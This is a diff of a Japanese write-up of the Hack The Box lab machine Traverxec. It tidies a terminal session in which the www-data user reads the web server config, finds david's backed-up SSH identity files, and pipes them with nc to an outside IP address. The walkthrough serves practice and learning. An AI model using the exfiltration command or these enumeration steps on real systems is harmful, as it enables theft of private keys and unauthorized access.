@@ -140,16 +140,13 @@ www-data@traverxec:/usr/bin$ export TERM=xterm-256color
 www-data@traverxec:/usr/bin$ stty rows 66 columns 236
 
 www-data@traverxec:/usr/bin$ id
-id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 www-data@traverxec:/usr/bin$ ls -l /home
-ls -l /home
 total 4
 drwx--x--x 5 david david 4096 Oct 25  2019 david
 
 www-data@traverxec:/usr/bin$ cat /home/david/user.txt
-cat /home/david/user.txt
 cat: /home/david/user.txt: Permission denied
 ```
 
@@ -161,7 +158,6 @@ webの設定コンフィグっぽいものを発見
 しかしユーザのホームディレクトリを全公開しないように、homedirs_publicオプションでサブディレクトリ`public_www`だけにアクセスを制限しているっぽい  
 ```sh
 www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
-cat /var/nostromo/conf/nhttpd.conf
 # MAIN [MANDATORY]
 
 servername              traverxec.htb
@@ -198,10 +194,8 @@ homedirs_public         public_www
 「index.html」などを発見
 ```sh
 www-data@traverxec:/usr/bin$ cd /home/david/public_www
-cd /home/david/public_www
 
 www-data@traverxec:/home/david/public_www$ ls -l
-ls -l
 total 8
 -rw-r--r-- 1 david david  402 Oct 25  2019 index.html
 drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
@@ -212,12 +206,10 @@ drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
 さらにssh鍵のバックアップを発見、ncコマンドで配送
 ```sh
 www-data@traverxec:/home/david/public_www$ ls -l protected-file-area
-ls -l protected-file-area
 total 4
 -rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
 
 www-data@traverxec:/home/david/public_www$ cat protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.16.7 80
-<ea/backup-ssh-identity-files.tgz | nc 10.10.16.7 80
 ```
 ssh秘密鍵でログイン、がパスフレーズがあるもよう
 ```sh
